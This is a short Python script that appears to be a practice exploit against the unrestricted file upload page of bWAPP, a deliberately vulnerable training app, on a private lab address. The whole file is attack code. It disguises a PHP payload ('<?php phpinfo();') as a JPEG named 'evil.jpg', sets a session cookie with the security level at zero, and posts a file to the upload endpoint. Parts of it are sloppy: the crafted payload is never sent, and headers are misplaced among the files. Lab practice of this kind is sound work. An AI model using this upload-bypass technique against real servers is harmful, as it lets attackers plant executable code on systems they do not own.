#!/usr/bin/python
# http://nullcandy.com/php-image-upload-security-how-not-to-do-it/
import requests

url = 'http://192.168.1.13/bWAPP/unrestricted_file_upload.php'
host = '192.168.1.13'
port = '80'
path = '/home/skhorn/Documents/Pentesting/test-files/fuck.jpg'

cookie = {
    'PHPSESSID': 'b2e73025dba7f9b2df9109342c6d74a0',
    'security_level': '0'
}
payload = {
    "------ThisIsABoundary \
    content-Disposition: form-data; name='file'; filename='evil.jpg'\
    content-Type: image/jpeg\
    \
    <?php phpinfo();\
    ------ThisIsABoundary--"
}
header = {
    'Host': host+':'+port,
    # 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0)\
    # Gecko/20100101 Firefox/45.0',
    'User-agent': 'Evil-Test',
    'Accept': 'text/html,application/xhtml+xml,application/\
    xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://192.168.1.13/bWAPP/unrestricted_file_upload.php',
    'Connection': 'close',
    # 'Content-Type': 'multipart/form-data; boundary=------ThisIsABoundary',
    # 'Content-Length': '7400',
}
files = {
    'file': open(path, 'rb'),
    'Content-Type': 'multipart/form-data',
    'Content-Length': '475',
    'Content-Type': 'image/jpeg'
}
response = requests.post(url, headers=header, cookies=cookie, files=files)

print response
print response.headers
